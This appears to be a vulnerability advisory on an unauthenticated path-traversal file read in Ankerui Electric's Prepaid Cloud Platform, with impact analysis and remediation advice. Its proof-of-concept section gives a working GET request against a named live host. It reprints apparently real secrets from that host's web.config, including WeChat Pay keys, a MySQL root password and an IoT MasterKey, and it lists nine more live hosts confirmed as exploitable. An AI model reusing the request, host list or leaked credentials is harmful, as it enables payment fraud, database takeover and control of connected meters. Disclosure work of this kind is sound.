# Ankerui Electric Prepaid Cloud Platform — Arbitrary File Read Leading to Mass Data Leakage

---

## 1. Basic Information
- **Vulnerability ID**: [Assigned by CNA]
- **Vulnerability Type**: Arbitrary File Read / Path Traversal / Sensitive Data Exposure (CWE-22 / CWE-200)
- **Severity**: Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — individual; escalated to CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H when chained with leaked credentials)
- **Vendor**: Ankerui Electric Co., Ltd. (安科瑞电气股份有限公司)
- **Product**: Prepaid Cloud Platform (预付费云平台)
- **Affected Versions**: All currently deployed versions (confirmed across 10+ public-facing instances)
- **Disclosure Status**: Publicly disclosed via public backup files and directly observable on live instances

---

## 2. Vulnerability Description

Ankerui Electric's Prepaid Cloud Platform exposes an **unauthenticated arbitrary file read** endpoint at `/Report/ExcelAndDownload?filePath=<path>&excelName=`. The `filePath` parameter accepts absolute Windows file paths without any sanitization or path restriction, allowing a remote, unauthenticated attacker to read **any file** on the server's filesystem — including the application's `web.config` configuration file.

The leaked `web.config` contains **plaintext credentials and secrets** for:
- **Alipay payment gateway** (App ID, RSA 2048-bit private key, public key)
- **WeChat Pay** (App ID, App Secret, merchant ID, payment API key)
- **WeChat Mini Program & Official Account** (App ID, secrets)
- **MySQL database** (connection string with root credentials)
- **Redis cache** (password)
- **MongoDB** (connection string)
- **CTWing IoT platform** (AppKey, AppSecret, MasterKey — enabling remote device control)
- **SOAP/internal API credentials**
- **Internal network topology** (intranet IPs, payment callback URLs)

This single file read effectively grants an attacker the "keys to the kingdom," enabling full compromise of payment systems, databases, IoT devices, and internal services.

The vendor's product attribution is confirmed via the QR code on the platform's landing page, which decodes to `http://yun.acrel-eem.com/qrcode/qrcode_download.html` (ICP filing: 沪ICP备18035382号).

> - ![image-20260628124318588](C:/Users/32238/AppData/Roaming/Typora/typora-user-images/image-20260628124318588.png)

---

## 3. Proof of Concept (PoC)

### 3.1 Generic PoC — Read Windows System File

```
GET /Report/ExcelAndDownload?filePath=C:\Windows\win.ini&excelName= HTTP/1.1
Host: 121.42.13.86:10315
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

> - ![image-20260628124510259](C:/Users/32238/AppData/Roaming/Typora/typora-user-images/image-20260628124510259.png)

### 3.2 Confirmed Exploitation — Read web.config and Extract All Secrets

**Target**: `121.42.13.86:10315`

**Step 1** — Read the `web.config` file:

The response returned the complete `web.config` with **all plaintext secrets** (abbreviated for readability):

```xml
<appSettings>
    <add key="RedisType" value="false"/>
    <add key="RedisPWD" value="123456"/>
    <add key="redisServiceIP" value="127.0.0.1"/>
    <add key="MongoDB" value="mongodb://127.0.0.1:27017;db=acreldb30"/>
    <add key="WebUrl" value="http://121.42.13.86:10315"/>
    <add key="wx_appid" value="wx1e6d244b3caaa3d3"/>
    <add key="wxgzh_appid" value="wx23b269073297a608"/>
    <add key="wx_mch_id" value="1268094001"/>
    <add key="wx_key" value="4c5b0c2297fc16ad41f31dada43d16db"/>
    <add key="wxgzh_key" value="0aa506c7677f8d051a7bb08c04a4fd47"/>
    <add key="pay_key" value="AcrelPayment12345678901212345678"/>
    <add key="ali_app_id" value="2019070865770893"/>
    <add key="ali_private_key" value="MIIEpAIBAAKCAQE...(full RSA 2048-bit PKCS#8 private key)..."/>
    <add key="ali_public_key" value="MIIBIjANBgkqh...(full RSA 2048-bit public key)..."/>
    <add key="CTWing_AppKey" value="UbpPJdgqaNd"/>
    <add key="CTWing_AppSecret" value="izjsBqmxe9"/>
    <add key="CTWing_MasterKey" value="85a82fd2d0134d4b977886fbde402598"/>
    <add key="soapUser" value="acrel"/>
    <add key="soapPwd" value="123456"/>
    <add key="wxpay_notify_url" value="http://192.168.8.51:16028/api/App/PayNotify"/>
</appSettings>
<connectionStrings>
    <add name="JuCheapModel" connectionString="...server=127.0.0.1;user id=root;password=acrel;...database=acreldb30"/>
</connectionStrings>
```

### 3.3 Leaked Credentials Summary

| Category | Configuration Key | Leaked Value | Risk |
|----------|------------------|--------------|------|
| Alipay | `ali_app_id` | `2019070865770893` | Application identity theft |
| Alipay | `ali_private_key` | RSA 2048-bit PKCS#8 private key (full) | Payment forgery / fund theft |
| Alipay | `ali_public_key` | RSA 2048-bit public key | Signature verification bypass |
| WeChat Pay | `pay_key` | `AcrelPayment12345678901212345678` | Payment forgery |
| WeChat Mini Program | `wx_appid` / `wx_key` | `wx1e6d244b3caaa3d3` / `4c5b0c2297fc16ad41f31dada43d16db` | Mini program hijacking |
| WeChat Official Account | `wxgzh_appid` / `wxgzh_key` | `wx23b269073297a608` / `0aa506c7677f8d051a7bb08c04a4fd47` | Official account hijacking |
| WeChat Merchant | `wx_mch_id` | `1268094001` | Merchant identity |
| MySQL | Connection String | `server=127.0.0.1;user=root;password=acrel;database=acreldb30` | Full database control |
| Redis | `RedisPWD` | `123456` | Cache data compromise |
| MongoDB | Connection String | `mongodb://127.0.0.1:27017;db=acreldb30` | Document database control |
| CTWing IoT | `CTWing_AppKey` | `UbpPJdgqaNd` | IoT platform identity |
| CTWing IoT | `CTWing_AppSecret` | `izjsBqmxe9` | IoT platform credential |
| CTWing IoT | `CTWing_MasterKey` | `85a82fd2d0134d4b977886fbde402598` | Remote device management |
| SOAP/API | `soapUser` / `soapPwd` | `acrel` / `123456` | Internal API access |
| Payment Callback | `wxpay_notify_url` | `http://192.168.8.51:16028/api/App/PayNotify` | Internal network recon |
| Payment Callback | `alipay_notify_url` | `https://yunpay.acrel-eem.com/acrel/api/App/AliNotify` | Internal domain disclosure |

> - - ![image-20260628124924584](C:/Users/32238/AppData/Roaming/Typora/typora-user-images/image-20260628124924584.png)

### 3.4 Additional Confirmed Vulnerable Hosts

| # | Target IP:Port | File Read Verified |
|---|---------------|:---:|
| 1 | 121.42.13.86:10315 | ✅ (web.config fully extracted) |
| 2 | 122.192.0.10:10315 | ✅ |
| 3 | 47.118.40.68:10315 | ✅ |
| 4 | 47.97.116.128:10315 | ✅ |
| 5 | 223.247.208.167:10315 | ✅ |
| 6 | 27.8.44.14:10315 | ✅ |
| 7 | 222.76.248.62:10315 | ✅ |
| 8 | 117.157.71.72:10315 | ✅ |
| 9 | 47.97.252.127:10315 | ✅ |

---

## 4. Impact Analysis

- **Payment System Compromise**: Leaked Alipay RSA private key and WeChat Pay API key allow attackers to forge payment signatures, issue fraudulent refunds, and intercept/modify transactions.
- **Complete Database Control**: Leaked MySQL root credentials enable full read/write/delete access to all business data — user accounts, payment records, meter readings, and personal information.
- **IoT Device Hijacking**: Leaked CTWing MasterKey grants remote control over all connected NB-IoT electricity meters and water meters.
- **WeChat Ecosystem Takeover**: Leaked WeChat Mini Program and Official Account credentials allow attackers to impersonate the vendor, push malicious content to users, and access user data.
- **Internal Network Pivot**: Exposed internal IPs (`192.168.8.x`) and internal service endpoints provide a roadmap for lateral movement attacks.
- **Regulatory Violations**: Mass exposure of personal data and payment credentials violates China's PIPL, Cybersecurity Law, and PCI-DSS equivalent standards.
- **Supply Chain Risk**: The same platform is deployed across multiple customer sites; credentials may be reused across deployments.

---

## 5. Technical Details

- **Root Cause**: The `/Report/ExcelAndDownload` endpoint passes the user-supplied `filePath` parameter directly to the filesystem API without any path validation, sanitization, or access control. An attacker can specify any absolute Windows path (e.g., `C:\Windows\win.ini` or `D:\...\web.config`) and the server will read and return it.
- **Technology Stack**: ASP.NET MVC 5.2 on IIS 8.5, .NET Framework 4.5.2.
- **No Authentication Required**: The endpoint is publicly accessible without any token, session, or credential check.
- **Server Info Disclosure**: The response headers leak server software and version information:
  - `Server: Microsoft-IIS/8.5`
  - `X-AspNetMvc-Version: 5.2`
  - `X-AspNet-Version: 4.0.30319`
  - `X-Powered-By: ASP.NET`
- **Attack Complexity**: Low — a single unauthenticated HTTP GET request returns the full file contents. No special tools required beyond curl or a browser.

---

## 6. Remediation Suggestions

1. **Immediate Actions**:
   - Implement strict path validation on the `filePath` parameter — allow only a predefined list of safe file paths and reject any paths containing `..`, `\`, or absolute drive letters.
   - Enforce authentication and authorization on the `/Report/ExcelAndDownload` endpoint immediately.
   - **Rotate all exposed credentials immediately**: Alipay RSA key pair, WeChat Pay API key, all WeChat app secrets, MySQL/Redis/MongoDB passwords, CTWing IoT credentials, SOAP credentials.
   - Review access logs for any historical exploitation of this endpoint.
2. **Long-Term Fixes**:
   - Never store plaintext secrets in `web.config` or application configuration files. Use Azure Key Vault, AWS Secrets Manager, or environment variables with DPAPI encryption.
   - Implement a Web Application Firewall (WAF) rule to detect and block path traversal patterns in URL parameters.
   - Apply the principle of least privilege to all service accounts (database, Redis, MongoDB).
   - Conduct a full security audit to identify all endpoints lacking authentication and input validation.
   - Establish a secure deployment checklist that includes credential rotation and configuration review.